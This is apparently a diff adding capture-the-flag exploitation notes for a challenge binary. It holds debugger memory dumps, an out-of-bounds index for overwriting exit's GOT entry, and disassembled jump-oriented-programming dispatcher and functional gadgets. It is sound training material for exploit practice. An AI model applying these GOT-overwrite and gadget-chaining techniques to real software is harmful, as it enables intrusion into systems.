@@ -1,0 +1,59 @@
+review and review_names are global vars
+
+review_names = 0x4046a0
+review = 0x4046e0
+
+0x4046a0 <review_names>:        0x004052a0      0x00000000      0x004052c0      0x00000000
+0x4046b0 <review_names+16>:     0x004052e0      0x00000000      0x00405300      0x00000000
+0x4046c0 <review_names+32>:     0x00405320      0x00000000      0x00000000      0x00000000
+0x4046d0:       0x00000000      0x00000000      0x00000000      0x00000000
+0x4046e0 <review>:      0x41414141      0x41414141      0x41414141      0x41414141
+0x4046f0 <review+16>:   0x41414141      0x41414141      0x41414141      0x41414141
+
+
+gef➤  search-pattern 0x404650
+[+] Searching '\x50\x46\x40' in memory
+[+] In '/home/vagrant/ctf/spaceHeroes23/jedi/jedi.bin'(0x400000-0x401000), permission=r--
+  0x400700 - 0x400703  →   "PF@"
+gef➤  x/24wx 0x400700
+0x400700:       0x00404650      0x00000000      0x00000007      0x0000000b
+0x400710:       0x00000000      0x00000000      0x00000000      0x00000000
+
+
+-2036 to overwrite exit@got
+
+
+https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf
+(look at 3. Design)
+
+there are a lot of these quote functions that has jop gadgets
+
+
+initial setup:
+  4013a0:       49 c7 c0 10 13 40 00    mov    r8,0x401310 (func quote2, which is whr the dispatcher gadget is in)
+  4013a7:       49 c7 c1 e0 46 40 00    mov    r9,0x4046e0 (review)
+  4013ae:       49 83 c0 10             add    r8,0x10
+  4013b2:       41 ff e0                jmp    r8
+
+  jmp into r8 to go to dispatcher gadget
+  jmp r8 to dispatcher gadget -> jmp into another gadget to do smthg -> jmp back into r8 to dispatcher
+
+dispatcher gadget:
+  401320:       49 83 c1 08             add    r9,0x8
+  401324:       41 ff 21                jmp    QWORD PTR [r9]
+  
+
+functional gadgets to setup rdi and rsi:
+  401340:       48 89 fe                mov    rsi,rdi
+  401343:       41 ff e0                jmp    r8
+
+
+  401360:       48 d1 e7                shl    rdi,1
+  401363:       41 ff e0                jmp    r8
+
+  401380:       48 31 ff                xor    rdi,rdi
+  401383:       41 ff e0                jmp    r8
+
+
+  4013d0:       48 83 c7 01             add    rdi,0x1
+  4013d4:       41 ff e0                jmp    r8
